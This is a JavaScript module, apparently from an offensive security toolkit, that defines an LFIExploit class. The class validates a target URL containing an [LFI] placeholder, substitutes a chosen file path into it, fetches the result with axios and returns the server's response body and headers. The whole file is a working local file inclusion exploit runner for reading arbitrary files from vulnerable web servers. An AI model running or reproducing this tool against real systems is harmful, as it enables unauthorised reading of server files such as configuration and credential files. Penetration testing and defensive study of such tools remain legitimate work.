const axios = require('axios');

const LFI_TOKEN = `[LFI]`;

class LFIExploit {
  constructor() {
    this.url = '';
    this.path = '';
  }

  init(params) {
    return this.validate(params);
  }

  validate(params) {
    const required = ['url', 'path'];
    let errors = [];

    // Check all required params present and have values
    required.forEach((key) => {
      if (!params.hasOwnProperty(key) || params[key] == '') {
        errors.push(`Required parameter missing or empty: ${key}`);
      }
    });

    // Check URL contains the LFI token
    if (!params.url.includes(LFI_TOKEN)) {
      errors.push(`Missing LFI token in URL`);
    }

    if (errors.length) {
      return {
        hasError: true,
        details: errors
      };
    }

    this.url = params.url;
    this.path = params.path;

    return {
      hasError: false,
      data: {}
    };
  }

  resolveUrl() {
    return this.url.replace(LFI_TOKEN, this.path);
  }

  async run() {
    try {
      const targetUrl = this.resolveUrl();
      const response = await axios.get(targetUrl);
      return {
        hasError: false,
        data: {
          config: response.config,
          data: response.data,
          headers: response.headers,
          status: response.status,
          statusText: response.statusText
        }
      };
    } catch (error) {
      console.log(error);
      return {
        hasError: true,
        details: [`Error making request to target: ${error.message}`]
      };
    }
  }
}

module.exports = LFIExploit;
